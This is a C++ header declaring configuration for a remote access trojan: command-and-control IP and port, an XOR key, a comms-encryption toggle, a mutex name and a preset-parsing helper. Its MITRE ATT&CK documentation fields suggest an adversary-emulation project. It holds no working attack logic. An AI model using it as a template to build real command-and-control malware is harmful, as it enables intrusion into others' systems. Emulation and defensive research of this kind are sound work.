#include <vector>
#include <string>
#include "xor_string.hpp"

// rat settings
namespace Settings {
    // C2 Information
    extern std::string C2_IP_ADDRESS;
    extern std::string C2_PORT;

    // Packet Inforamtion
    extern std::string HEADER;

    // XOR key
    extern std::vector<unsigned char> key;

    // toggle comms encryption
    extern bool ENCRYPT_COMMS;

    // Mutex name
    extern std::string MUTEX_NAME;

    /*
     * SetPresetsToggle:
     *      About:
     *          Takes the value from the cmakepresets and converts it to a bool. 
     *          This is used when the value is "ON" or "OFF". 
     *          Technically thefunction only cares about "ON".
     *          Otherwise it will return false.
     *      Result:
     *          The outcome that this function produces a bool.
     *      Returns:
     *         bool
     *      MITRE ATT&CK Techniques:
     *          n/a
     *      CTI:
     *          n/a
     *      Other References:
     *          n/a
     */
    extern bool SetPresetsToggle(std::string settingValue);
}